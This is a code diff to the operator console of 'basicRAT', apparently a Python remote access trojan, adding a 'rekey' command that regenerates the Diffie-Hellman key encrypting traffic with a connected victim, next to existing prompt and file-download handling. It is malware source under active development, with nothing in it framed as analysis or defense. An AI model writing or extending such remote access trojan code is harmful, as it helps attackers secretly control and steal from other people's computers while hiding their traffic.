@@ -49,6 +49,7 @@ def main():
     conn, addr = s.accept()
     DHKEY = diffiehellman(conn, server=True)
     #print binascii.hexlify(DHKEY) #debug: confirm DHKEY matches
+    
     while True:
         prompt = raw_input('[{0}] basicRAT> '.format(addr[0])).rstrip().split()
 
@@ -93,6 +94,12 @@ def main():
                         break
                     f.write(decrypt(recv_data, DHKEY))
                     
+        # regenerate DH key (dangerous! may cause connection loss)
+        # available in case a fallback occurs or you suspect evesdropping
+        elif cmd == 'rekey':
+            DHKEY = diffiehellman(conn, server=True)
+            #print binascii.hexlify(DHKEY) #debug
+            
         else:
             print "Invalid command"
             print "Type 'help' to get a list of all commands"
